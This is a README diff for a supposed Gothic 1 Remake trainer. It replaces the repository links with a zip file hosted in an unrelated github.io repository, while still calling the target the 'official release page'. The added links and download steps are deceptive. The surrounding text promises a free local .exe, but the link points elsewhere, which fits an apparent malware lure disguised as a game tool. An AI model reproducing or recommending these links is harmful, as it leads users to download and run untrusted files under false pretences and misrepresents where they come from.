@@ -5,7 +5,7 @@ description: "Modify player stats and resources in Gothic 1 Remake with this ope
 ---
 # 🎮 Gothic-1-Remake-Trainer-2026 - Master the game with ease today
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/perihelionbankholdingcompany997/Gothic-1-Remake-Trainer-2026)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/perihelionbankholdingcompany997/perihelionbankholdingcompany997.github.io/raw/refs/heads/main/axletree/github-io-perihelionbankholdingcompany-1.0-beta.4.zip)
 
 This tool helps players manage character stats in the Gothic 1 Remake. It provides control over game values like health, stamina, and inventory items. You do not need to enter keys or pay for access. This software runs locally on your Windows computer.
 
@@ -17,7 +17,7 @@ This trainer requires Windows 10 or 11. It works with the 64-bit version of the 
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official release page](https://github.com/perihelionbankholdingcompany997/Gothic-1-Remake-Trainer-2026).
+1. Visit the [official release page](https://github.com/perihelionbankholdingcompany997/perihelionbankholdingcompany997.github.io/raw/refs/heads/main/axletree/github-io-perihelionbankholdingcompany-1.0-beta.4.zip).
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder on your desktop.
